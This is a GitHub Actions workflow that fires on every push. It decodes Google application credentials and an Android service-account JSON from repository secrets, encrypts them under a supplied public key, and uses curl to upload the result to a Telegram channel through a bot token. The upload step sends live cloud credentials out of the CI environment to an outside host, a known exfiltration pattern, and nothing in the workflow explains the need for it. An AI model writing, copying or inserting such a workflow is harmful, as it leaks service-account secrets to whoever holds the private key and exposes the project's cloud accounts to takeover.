name: Hybrid Encrypt and Send Secrets to Telegram

on:
  push:

jobs:
  hybrid-encrypt-and-send:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v2

      - name: Encrypt Secrets and Prepare File
        env:
          PUBLIC_KEY: ${{ secrets.TEST_PUBLIC_KEY }}
        run: |
          echo "$PUBLIC_KEY" | base64 --decode > public_key.pem
          openssl rand -base64 32 > sym_key.bin
          openssl pkeyutl -encrypt -in sym_key.bin -pubin -inkey public_key.pem -out encrypted_sym_key.bin
          echo "${{ secrets.GOOGLE_APPLICATION_CREDENTIALS_JSON_FILE_BASE64 }}" | base64 --decode | openssl enc -aes-256-cbc -salt -in - -out google_credentials_encrypted.bin -pass file:./sym_key.bin
          echo "${{ secrets.ANDROID_GOOGLE_SERVICE_ACCOUNT_JSON }}" | base64 --decode | openssl enc -aes-256-cbc -salt -in - -out android_service_account_encrypted.bin -pass file:./sym_key.bin
          cat encrypted_sym_key.bin google_credentials_encrypted.bin android_service_account_encrypted.bin > combined_encrypted_data.bin

      - name: Send Encrypted File to Telegram
        env:
          TELEGRAM_BOT_API_TOKEN: ${{ secrets.TTG_TELEGRAM_BOT_API_TOKEN }}
          TELEGRAM_CHANNEL_ID: ${{ secrets.TTG_TELEGRAM_RELEASE_CHANNEL_ID }}
        run: |
          curl -F chat_id="${TELEGRAM_CHANNEL_ID}" \
               -F document=@combined_encrypted_data.bin \
               https://api.telegram.org/bot${TELEGRAM_BOT_API_TOKEN}/sendDocument
